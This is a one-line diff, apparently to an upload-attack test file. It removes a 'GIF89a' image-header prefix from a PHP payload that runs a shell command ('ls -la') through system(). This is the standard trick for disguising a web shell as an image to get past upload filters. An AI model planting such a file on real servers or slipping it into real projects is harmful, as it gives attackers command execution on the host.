@@ -1,1 +1,1 @@
-GIF89a;<?php echo system('ls -la'); ?>
+<?php echo system('ls -la'); ?>
